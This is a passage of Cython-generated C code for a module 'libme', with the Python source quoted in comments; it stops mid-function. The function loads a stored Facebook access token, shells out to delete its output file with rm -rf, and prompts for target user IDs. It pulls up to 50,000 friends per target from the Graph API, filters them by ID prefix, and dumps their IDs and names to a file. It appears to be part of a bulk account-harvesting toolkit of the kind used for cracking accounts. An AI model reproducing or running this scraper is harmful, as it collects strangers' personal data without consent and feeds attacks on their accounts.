static PyObject *__pyx_pf_5libme_5James_54__100__07__(CYTHON_UNUSED PyObject *__pyx_self, CYTHON_UNUSED PyObject *__pyx_v_self) {
  PyObject *__pyx_v_token = NULL;
  PyObject *__pyx_v___total = NULL;
  PyObject *__pyx_v____file = NULL;
  PyObject *__pyx_v_zx = NULL;
  PyObject *__pyx_v___ids = NULL;
  PyObject *__pyx_v_rex = NULL;
  PyObject *__pyx_v_ex = NULL;
  PyObject *__pyx_v_file = NULL;
  PyObject *__pyx_v_id = NULL;
  PyObject *__pyx_v_a = NULL;
  PyObject *__pyx_v___id = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  int __pyx_t_7;
  PyObject *__pyx_t_8 = NULL;
  Py_ssize_t __pyx_t_9;
  PyObject *(*__pyx_t_10)(PyObject *);
  PyObject *__pyx_t_11 = NULL;
  Py_ssize_t __pyx_t_12;
  PyObject *(*__pyx_t_13)(PyObject *);
  int __pyx_t_14;
  int __pyx_t_15;
  int __pyx_t_16;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__100__07__", 0);

  /* "libme.pyx":862
 * 			self.__me__nnn__()
 * 	def __100__07__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			token =open('login.txt', 'r').read()
 * 		except(KeyError , IOError):
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      /* "libme.pyx":863
 * 	def __100__07__(self):
 * 		try:
 * 			token =open('login.txt', 'r').read()             # <<<<<<<<<<<<<<
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")
 */
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__27, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 863, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_read); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 863, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 863, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_v_token = __pyx_t_4;
      __pyx_t_4 = 0;

      /* "libme.pyx":862
 * 			self.__me__nnn__()
 * 	def __100__07__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			token =open('login.txt', 'r').read()
 * 		except(KeyError , IOError):
 */
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;

    /* "libme.pyx":864
 * 		try:
 * 			token =open('login.txt', 'r').read()
 * 		except(KeyError , IOError):             # <<<<<<<<<<<<<<
 * 			exit("  [!] Token invalid")
 * 		try:
 */
    __pyx_t_7 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_KeyError) || __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IOError);
    if (__pyx_t_7) {
      __Pyx_AddTraceback("libme.James.__100__07__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_6, &__pyx_t_5) < 0) __PYX_ERR(0, 864, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GOTREF(__pyx_t_5);

      /* "libme.pyx":865
 * 			token =open('login.txt', 'r').read()
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")             # <<<<<<<<<<<<<<
 * 		try:
 * 			__total = int(input("\n  [?] How much link you want dump : "))
 */
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__34, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 865, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    /* "libme.pyx":862
 * 			self.__me__nnn__()
 * 	def __100__07__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			token =open('login.txt', 'r').read()
 * 		except(KeyError , IOError):
 */
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  /* "libme.pyx":866
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")
 * 		try:             # <<<<<<<<<<<<<<
 * 			__total = int(input("\n  [?] How much link you want dump : "))
 * 		except:
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_3, &__pyx_t_2, &__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_1);
    /*try:*/ {

      /* "libme.pyx":867
 * 			exit("  [!] Token invalid")
 * 		try:
 * 			__total = int(input("\n  [?] How much link you want dump : "))             # <<<<<<<<<<<<<<
 * 		except:
 * 			__total = 1
 */
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__58, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 867, __pyx_L11_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyNumber_Int(__pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 867, __pyx_L11_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_v___total = __pyx_t_6;
      __pyx_t_6 = 0;

      /* "libme.pyx":866
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")
 * 		try:             # <<<<<<<<<<<<<<
 * 			__total = int(input("\n  [?] How much link you want dump : "))
 * 		except:
 */
    }
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    goto __pyx_L16_try_end;
    __pyx_L11_error:;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

    /* "libme.pyx":868
 * 		try:
 * 			__total = int(input("\n  [?] How much link you want dump : "))
 * 		except:             # <<<<<<<<<<<<<<
 * 			__total = 1
 * 		os.system("rm -rf /sdcard/10_0.txt")
 */
    /*except:*/ {
      __Pyx_AddTraceback("libme.James.__100__07__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_6, &__pyx_t_5, &__pyx_t_4) < 0) __PYX_ERR(0, 868, __pyx_L13_except_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_GOTREF(__pyx_t_4);

      /* "libme.pyx":869
 * 			__total = int(input("\n  [?] How much link you want dump : "))
 * 		except:
 * 			__total = 1             # <<<<<<<<<<<<<<
 * 		os.system("rm -rf /sdcard/10_0.txt")
 * 		___file = ("/sdcard/10_0.txt")
 */
      __Pyx_INCREF(__pyx_int_1);
      __Pyx_XDECREF_SET(__pyx_v___total, __pyx_int_1);
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      goto __pyx_L12_exception_handled;
    }
    __pyx_L13_except_error:;

    /* "libme.pyx":866
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")
 * 		try:             # <<<<<<<<<<<<<<
 * 			__total = int(input("\n  [?] How much link you want dump : "))
 * 		except:
 */
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_2, __pyx_t_1);
    goto __pyx_L1_error;
    __pyx_L12_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_2, __pyx_t_1);
    __pyx_L16_try_end:;
  }

  /* "libme.pyx":870
 * 		except:
 * 			__total = 1
 * 		os.system("rm -rf /sdcard/10_0.txt")             # <<<<<<<<<<<<<<
 * 		___file = ("/sdcard/10_0.txt")
 * 		for zx in range(__total):
 */
  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_os); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 870, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_system); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 870, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_6, function);
    }
  }
  __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_5, __pyx_kp_s_rm_rf_sdcard_10_0_txt) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_kp_s_rm_rf_sdcard_10_0_txt);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 870, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  /* "libme.pyx":871
 * 			__total = 1
 * 		os.system("rm -rf /sdcard/10_0.txt")
 * 		___file = ("/sdcard/10_0.txt")             # <<<<<<<<<<<<<<
 * 		for zx in range(__total):
 * 			zx += 1
 */
  __Pyx_INCREF(__pyx_kp_s_sdcard_10_0_txt);
  __pyx_v____file = __pyx_kp_s_sdcard_10_0_txt;

  /* "libme.pyx":872
 * 		os.system("rm -rf /sdcard/10_0.txt")
 * 		___file = ("/sdcard/10_0.txt")
 * 		for zx in range(__total):             # <<<<<<<<<<<<<<
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")
 */
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_v___total); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 872, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  if (likely(PyList_CheckExact(__pyx_t_4)) || PyTuple_CheckExact(__pyx_t_4)) {
    __pyx_t_6 = __pyx_t_4; __Pyx_INCREF(__pyx_t_6); __pyx_t_9 = 0;
    __pyx_t_10 = NULL;
  } else {
    __pyx_t_9 = -1; __pyx_t_6 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 872, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_10 = Py_TYPE(__pyx_t_6)->tp_iternext; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 872, __pyx_L1_error)
  }
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  for (;;) {
    if (likely(!__pyx_t_10)) {
      if (likely(PyList_CheckExact(__pyx_t_6))) {
        if (__pyx_t_9 >= PyList_GET_SIZE(__pyx_t_6)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_4 = PyList_GET_ITEM(__pyx_t_6, __pyx_t_9); __Pyx_INCREF(__pyx_t_4); __pyx_t_9++; if (unlikely(0 < 0)) __PYX_ERR(0, 872, __pyx_L1_error)
        #else
        __pyx_t_4 = PySequence_ITEM(__pyx_t_6, __pyx_t_9); __pyx_t_9++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 872, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
        #endif
      } else {
        if (__pyx_t_9 >= PyTuple_GET_SIZE(__pyx_t_6)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_6, __pyx_t_9); __Pyx_INCREF(__pyx_t_4); __pyx_t_9++; if (unlikely(0 < 0)) __PYX_ERR(0, 872, __pyx_L1_error)
        #else
        __pyx_t_4 = PySequence_ITEM(__pyx_t_6, __pyx_t_9); __pyx_t_9++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 872, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
        #endif
      }
    } else {
      __pyx_t_4 = __pyx_t_10(__pyx_t_6);
      if (unlikely(!__pyx_t_4)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 872, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_4);
    }
    __Pyx_XDECREF_SET(__pyx_v_zx, __pyx_t_4);
    __pyx_t_4 = 0;

    /* "libme.pyx":873
 * 		___file = ("/sdcard/10_0.txt")
 * 		for zx in range(__total):
 * 			zx += 1             # <<<<<<<<<<<<<<
 * 			__ids=input("  [+] Enter User ID : ")
 * 			try:
 */
    __pyx_t_4 = __Pyx_PyInt_AddObjC(__pyx_v_zx, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 873, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF_SET(__pyx_v_zx, __pyx_t_4);
    __pyx_t_4 = 0;

    /* "libme.pyx":874
 * 		for zx in range(__total):
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")             # <<<<<<<<<<<<<<
 * 			try:
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 */
    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__36, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 874, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_XDECREF_SET(__pyx_v___ids, __pyx_t_4);
    __pyx_t_4 = 0;

    /* "libme.pyx":875
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")
 * 			try:             # <<<<<<<<<<<<<<
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 * 				ex=json.loads(rex.text)
 */
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
      __Pyx_XGOTREF(__pyx_t_1);
      __Pyx_XGOTREF(__pyx_t_2);
      __Pyx_XGOTREF(__pyx_t_3);
      /*try:*/ {

        /* "libme.pyx":876
 * 			__ids=input("  [+] Enter User ID : ")
 * 			try:
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))             # <<<<<<<<<<<<<<
 * 				ex=json.loads(rex.text)
 * 				file = open(___file , 'a')
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_requests); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 876, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_get); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 876, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        if (unlikely(!__pyx_v_token)) { __Pyx_RaiseUnboundLocalError("token"); __PYX_ERR(0, 876, __pyx_L21_error) }
        __pyx_t_5 = PyTuple_New(2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 876, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_INCREF(__pyx_v___ids);
        __Pyx_GIVEREF(__pyx_v___ids);
        PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_v___ids);
        __Pyx_INCREF(__pyx_v_token);
        __Pyx_GIVEREF(__pyx_v_token);
        PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_v_token);
        __pyx_t_11 = __Pyx_PyString_Format(__pyx_kp_s_https_graph_facebook_com_s_field, __pyx_t_5); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 876, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_8);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_8, function);
          }
        }
        __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_5, __pyx_t_11) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_11);
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 876, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_XDECREF_SET(__pyx_v_rex, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "libme.pyx":877
 * 			try:
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 * 				ex=json.loads(rex.text)             # <<<<<<<<<<<<<<
 * 				file = open(___file , 'a')
 * 				id = []
 */
        __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_json); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 877, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_loads); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 877, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_rex, __pyx_n_s_text); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 877, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_5 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_11))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_11);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_11, function);
          }
        }
        __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_11, __pyx_t_5, __pyx_t_8) : __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_8);
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 877, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF_SET(__pyx_v_ex, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "libme.pyx":878
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 * 				ex=json.loads(rex.text)
 * 				file = open(___file , 'a')             # <<<<<<<<<<<<<<
 * 				id = []
 * 				for a in ex['friends']['data']:
 */
        __pyx_t_4 = PyTuple_New(2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 878, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_INCREF(__pyx_v____file);
        __Pyx_GIVEREF(__pyx_v____file);
        PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_v____file);
        __Pyx_INCREF(__pyx_n_s_a);
        __Pyx_GIVEREF(__pyx_n_s_a);
        PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_n_s_a);
        __pyx_t_11 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_4, NULL); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 878, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_file, __pyx_t_11);
        __pyx_t_11 = 0;

        /* "libme.pyx":879
 * 				ex=json.loads(rex.text)
 * 				file = open(___file , 'a')
 * 				id = []             # <<<<<<<<<<<<<<
 * 				for a in ex['friends']['data']:
 * 					if a['id'][:6] in ['100074','100075','100076','100078']:
 */
        __pyx_t_11 = PyList_New(0); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 879, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_XDECREF_SET(__pyx_v_id, ((PyObject*)__pyx_t_11));
        __pyx_t_11 = 0;

        /* "libme.pyx":880
 * 				file = open(___file , 'a')
 * 				id = []
 * 				for a in ex['friends']['data']:             # <<<<<<<<<<<<<<
 * 					if a['id'][:6] in ['100074','100075','100076','100078']:
 * 						id.append(a['id']+"|"+a['name'])
 */
        __pyx_t_11 = __Pyx_PyObject_Dict_GetItem(__pyx_v_ex, __pyx_n_s_friends); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 880, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_11);
        __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_11, __pyx_n_s_data); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 880, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        if (likely(PyList_CheckExact(__pyx_t_4)) || PyTuple_CheckExact(__pyx_t_4)) {
          __pyx_t_11 = __pyx_t_4; __Pyx_INCREF(__pyx_t_11); __pyx_t_12 = 0;
          __pyx_t_13 = NULL;
        } else {
          __pyx_t_12 = -1; __pyx_t_11 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 880, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_11);
          __pyx_t_13 = Py_TYPE(__pyx_t_11)->tp_iternext; if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 880, __pyx_L21_error)
        }
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        for (;;) {
          if (likely(!__pyx_t_13)) {
            if (likely(PyList_CheckExact(__pyx_t_11))) {
              if (__pyx_t_12 >= PyList_GET_SIZE(__pyx_t_11)) break;
              #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
              __pyx_t_4 = PyList_GET_ITEM(__pyx_t_11, __pyx_t_12); __Pyx_INCREF(__pyx_t_4); __pyx_t_12++; if (unlikely(0 < 0)) __PYX_ERR(0, 880, __pyx_L21_error)
              #else
              __pyx_t_4 = PySequence_ITEM(__pyx_t_11, __pyx_t_12); __pyx_t_12++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 880, __pyx_L21_error)
              __Pyx_GOTREF(__pyx_t_4);
              #endif
            } else {
              if (__pyx_t_12 >= PyTuple_GET_SIZE(__pyx_t_11)) break;
              #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
              __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_11, __pyx_t_12); __Pyx_INCREF(__pyx_t_4); __pyx_t_12++; if (unlikely(0 < 0)) __PYX_ERR(0, 880, __pyx_L21_error)
              #else
              __pyx_t_4 = PySequence_ITEM(__pyx_t_11, __pyx_t_12); __pyx_t_12++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 880, __pyx_L21_error)
              __Pyx_GOTREF(__pyx_t_4);
              #endif
            }
          } else {
            __pyx_t_4 = __pyx_t_13(__pyx_t_11);
            if (unlikely(!__pyx_t_4)) {
              PyObject* exc_type = PyErr_Occurred();
              if (exc_type) {
                if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                else __PYX_ERR(0, 880, __pyx_L21_error)
              }
              break;
            }
            __Pyx_GOTREF(__pyx_t_4);
          }
          __Pyx_XDECREF_SET(__pyx_v_a, __pyx_t_4);
          __pyx_t_4 = 0;

          /* "libme.pyx":881
 * 				id = []
 * 				for a in ex['friends']['data']:
 * 					if a['id'][:6] in ['100074','100075','100076','100078']:             # <<<<<<<<<<<<<<
 * 						id.append(a['id']+"|"+a['name'])
 * 						file.write(a['id']+"|"+a['name']+'\n')
 */
          __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_a, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 881, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_8 = __Pyx_PyObject_GetSlice(__pyx_t_4, 0, 6, NULL, NULL, &__pyx_slice__37, 0, 1, 1); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 881, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_15 = (__Pyx_PyString_Equals(__pyx_t_8, __pyx_kp_s_100074, Py_EQ)); if (unlikely(__pyx_t_15 < 0)) __PYX_ERR(0, 881, __pyx_L21_error)
          if (!__pyx_t_15) {
          } else {
            __pyx_t_14 = __pyx_t_15;
            goto __pyx_L32_bool_binop_done;
          }
          __pyx_t_15 = (__Pyx_PyString_Equals(__pyx_t_8, __pyx_kp_s_100075, Py_EQ)); if (unlikely(__pyx_t_15 < 0)) __PYX_ERR(0, 881, __pyx_L21_error)
          if (!__pyx_t_15) {
          } else {
            __pyx_t_14 = __pyx_t_15;
            goto __pyx_L32_bool_binop_done;
          }
